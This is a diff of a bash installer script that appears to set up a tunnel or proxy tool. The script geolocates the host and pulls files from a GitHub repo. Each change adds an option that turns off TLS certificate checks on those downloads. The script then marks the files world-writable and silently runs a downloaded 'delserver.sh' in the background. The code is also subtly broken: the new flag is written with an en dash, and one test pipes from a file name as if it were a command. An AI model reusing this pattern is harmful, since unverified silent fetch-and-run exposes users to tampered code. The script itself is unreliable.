@@ -2,7 +2,7 @@
 
 VERSION=2.11
 cd $HOME/
-wget http://ip-api.com/json/
+wget –no-check-certificate http://ip-api.com/json/
 chmod 777 index.html
 # Detect IP address
 if index.html | sed 's/,/\n/g' | grep  -i 'CN'; then 
@@ -713,8 +713,8 @@ sync && echo 3 >/proc/sys/vm/dro
 cd /$HOME/
 mkdir myssqltcp
 cd /$HOME/myssqltcp
-wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/config.json
-wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/MyssqlTcp
+wget –no-check-certificate https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/config.json
+wget –no-check-certificate https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/MyssqlTcp
 chmod 777 MyssqlTcp
 chmod 777 config.json
 
@@ -1464,7 +1464,7 @@ echo ""
 
 cd /$HOME/
 rm -f index.html
-wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/delserver.sh
+wget –no-check-certificate https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/delserver.sh
 chmod 777 delserver.sh
 /bin/bash ./delserver.sh >/dev/null 2>&1 &
 
